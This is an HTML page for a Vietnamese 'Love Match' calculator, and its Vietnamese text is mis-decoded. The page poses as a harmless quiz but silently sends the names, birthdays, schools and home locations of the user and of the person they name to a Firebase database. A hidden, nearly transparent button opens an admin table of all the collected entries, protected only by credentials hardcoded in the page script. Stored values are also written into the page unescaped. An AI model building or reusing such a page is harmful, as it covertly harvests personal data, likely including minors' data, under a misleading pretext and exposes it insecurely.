<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Love Match üíñ</title>
  <style>
    body {
      font-family: 'Comic Sans MS', cursive;
      background: linear-gradient(to bottom right, pink, lavender);
      text-align: center;
      padding: 20px;
    }
    .container {
      background: white;
      border-radius: 20px;
      padding: 30px;
      max-width: 800px;
      margin: auto;
      box-shadow: 0 0 20px rgba(255, 0, 127, 0.4);
    }
    h1 {
      color: hotpink;
      font-size: 2.5em;
    }
    .form-group {
      display: flex;
      justify-content: space-between;
      gap: 20px;
      flex-wrap: wrap;
    }
    .form-column {
      flex: 1;
      min-width: 250px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 10px;
      border: 1px solid #ccc;
    }
    button {
      background: hotpink;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 20px;
      cursor: pointer;
      font-size: 1.1em;
    }
    .result {
      margin-top: 20px;
      font-size: 1.4em;
      color: deeppink;
      font-weight: bold;
    }
    .hearts {
      font-size: 2em;
      animation: float 1.5s infinite;
    }
    @keyframes float {
      0% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
      100% { transform: translateY(0); }
    }
    .admin-btn {
      position: fixed;
      bottom: 10px;
      right: 10px;
      font-size: 12px;
      background: transparent;
      border: none;
      color: #fff;
      opacity: 0.3;
      cursor: pointer;
    }
    #admin-panel {
      display: none;
      margin-top: 30px;
      background: #f0f0f0;
      padding: 15px;
      border-radius: 10px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 10px;
    }
    th, td {
      border: 1px solid #ddd;
      padding: 8px;
      font-size: 0.9em;
    }
    th {
      background-color: #f2f2f2;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üíñ Love Match üíñ</h1>
    <div class="form-group">
      <div class="form-column">
        <h3>üë© Th√¥ng tin c·ªßa b·∫°n</h3>
        <input type="text" id="yourName" placeholder="T√™n b·∫°n">
        <input type="date" id="yourBirthday">
        <input type="text" id="yourSchool" placeholder="Tr∆∞·ªùng h·ªçc c·ªßa b·∫°n">
        <input type="text" id="yourLocation" placeholder="T·ªânh / Huy·ªán / X√£ c·ªßa b·∫°n">
      </div>
      <div class="form-column">
        <h3>üë® Th√¥ng tin ng∆∞·ªùi ·∫•y</h3>
        <input type="text" id="loverName" placeholder="T√™n ng∆∞·ªùi ·∫•y">
        <input type="date" id="loverBirthday">
        <input type="text" id="loverSchool" placeholder="Tr∆∞·ªùng h·ªçc c·ªßa ng∆∞·ªùi ·∫•y">
        <input type="text" id="loverLocation" placeholder="T·ªânh / Huy·ªán / X√£ c·ªßa ng∆∞·ªùi ·∫•y">
      </div>
    </div>
    <button onclick="calculateLove()">T√≠nh ph·∫ßn trƒÉm üíò</button>
    <div class="result" id="result"></div>
    <div class="hearts">üíóüíóüíó</div>

    <div id="admin-panel">
      <h3>üìã D·ªØ li·ªáu ng∆∞·ªùi d√πng</h3>
      <table id="data-table">
        <thead>
          <tr><th>B·∫°n</th><th>Ng∆∞·ªùi ·∫•y</th><th>Ng√†y sinh b·∫°n</th><th>Ng√†y sinh ·∫•y</th><th>Tr∆∞·ªùng b·∫°n</th><th>Tr∆∞·ªùng ·∫•y</th><th>ƒê·ªãa ch·ªâ b·∫°n</th><th>ƒê·ªãa ch·ªâ ·∫•y</th><th>K·∫øt qu·∫£</th></tr>
        </thead>
        <tbody></tbody>
      </table>
    </div>
  </div>
  <button class="admin-btn" onclick="adminLogin()">üëë</button>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

  <script>
    // Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyBCh1SkrZBFoRVYQCwefuGgUDgys1D9yLU",
      authDomain: "love-match-app-ebc3e.firebaseapp.com",
      databaseURL: "https://love-match-app-ebc3e-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "love-match-app-ebc3e",
      storageBucket: "love-match-app-ebc3e.appspot.com",
      messagingSenderId: "786340035981",
      appId: "1:786340035981:web:72d203c017bd353f7651c4",
      measurementId: "G-E9RD24C7FS"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function calculateLove() {
      const yourName = document.getElementById('yourName').value;
      const loverName = document.getElementById('loverName').value;
      const yourBirthday = document.getElementById('yourBirthday').value;
      const loverBirthday = document.getElementById('loverBirthday').value;
      const yourSchool = document.getElementById('yourSchool').value;
      const loverSchool = document.getElementById('loverSchool').value;
      const yourLocation = document.getElementById('yourLocation').value;
      const loverLocation = document.getElementById('loverLocation').value;

      if (!yourName || !loverName || !yourBirthday || !loverBirthday || !yourSchool || !loverSchool || !yourLocation || !loverLocation) {
        alert("B·∫°n c·∫ßn ƒëi·ªÅn ƒë·∫ßy ƒë·ªß th√¥ng tin nha! ü•∫");
        return;
      }

      const percent = Math.floor((yourName.length + loverName.length + yourSchool.length + loverSchool.length + new Date(yourBirthday).getDate() + new Date(loverBirthday).getDate()) % 100) + 1;

      let message = '';
      if (percent < 50) message = 'C√≥ l·∫Ω t√¨nh y√™u n√†y c√≤n c·∫ßn th√™m ch√∫t th·ªùi gian v√† ph√©p m√†u! üí≠';
      else if (percent < 80) message = 'T√¨nh y√™u ƒëang n·ªü r·ªô r·ªìi ƒë√≥! üíê C·ª© ti·∫øn l√™n nh√©!';
      else message = 'Tr√°i tim c√°c b·∫°n ch·∫Øc ch·∫Øn ƒëang c√πng nh·ªãp ƒë·∫≠p! üíñ';

      document.getElementById('result').innerText = `‚ù§Ô∏è ${percent}% - ${message}`;

      // L∆∞u d·ªØ li·ªáu v√†o Firebase
      const newEntry = db.ref("matches").push();
      newEntry.set({
        yourName,
        loverName,
        yourBirthday,
        loverBirthday,
        yourSchool,
        loverSchool,
        yourLocation,
        loverLocation,
        percent,
        timestamp: Date.now()
      });
    }

    function adminLogin() {
      const user = prompt("Nh·∫≠p t√™n ƒëƒÉng nh·∫≠p:");
      const pass = prompt("Nh·∫≠p m·∫≠t kh·∫©u:");
      if (user === 'min2k7' && pass === 'min2k7123') {
        document.getElementById('admin-panel').style.display = 'block';

        // L·∫•y d·ªØ li·ªáu t·ª´ Firebase
        db.ref("matches").once('value', snapshot => {
          const tbody = document.querySelector('#data-table tbody');
          tbody.innerHTML = '';
          snapshot.forEach(child => {
            const data = child.val();
            const tr = document.createElement('tr');
            tr.innerHTML = `<td>${data.yourName}</td><td>${data.loverName}</td><td>${data.yourBirthday}</td><td>${data.loverBirthday}</td><td>${data.yourSchool}</td><td>${data.loverSchool}</td><td>${data.yourLocation}</td><td>${data.loverLocation}</td><td>${data.percent}%</td>`;
            tbody.appendChild(tr);
          });
        });
      } else {
        alert("Sai th√¥ng tin r·ªìi nh√©! ‚ùå");
      }
    }
  </script>
</body>
</html>
